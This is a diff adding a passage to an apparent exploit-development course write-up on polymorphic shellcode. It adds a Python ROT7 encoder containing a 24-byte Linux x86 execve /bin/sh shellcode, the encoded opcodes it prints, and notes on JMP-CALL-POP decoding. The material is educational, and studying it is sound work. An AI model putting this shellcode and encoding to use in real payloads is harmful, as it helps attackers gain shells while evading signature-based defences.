@@ -36,6 +36,52 @@ If we break after the shellcode has been decoded, we can see that the decoded ve
 
 ### Polymorphic Shellcode
 
+Just like in the original Shell-Storm post, we will need a ROT7 encoder for our decoder to use. We will also use an `execve()` shellcode for this example.
+
+### a6-rot7-encode.py
+```python
+#!/usr/bin/python
+
+# Python ROT-7 Encoder
+# execve 24 bytes
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
+    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+)
+
+encoded = "\\x%02x," % len(bytearray(shellcode))
+encoded2 = "0x%02x," % len(bytearray(shellcode)) 
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+# boundary is computed as 255-ROT(x) where x, the amount to rotate by
+    if x > 248:
+        encoded += '\\x'
+        encoded += '%02x' %(7 -(256 - x))
+        encoded2 += '0x'
+        encoded2 += '%02x,' %(7 -(256 - x))
+    else:
+        encoded += '\\x'
+        encoded += '%02x'%(x+7)
+        encoded2 += '0x'
+        encoded2 += '%02x,' %(x+7)
+    
+print '\n%s\n\n%s\n\nShellcode Length: %d\n' % (encoded, encoded2, len(bytearray(shellcode)))
+```
+
+Running the encoder produces the following opcodes, which we will be decoding further on:
+
+```
+Encoded shellcode ...
+
+\x18,\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87
+
+0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87,
+
+Shellcode Length: 24
+```
+
 Like the original shellcode from Shell-Storm, the morphed version will use the `JMP-CALL-POP` technique to get the address of the encoded shellcode. However, the mathematical manipulation will be different: `f(x) = x - 0x7`, where `x` is the next opcode. The encoded opcode will be replaced by the decoded one, which would be the result of the aforementioned mathematical expression.
 
 ### a6-rot7-decode.nasm
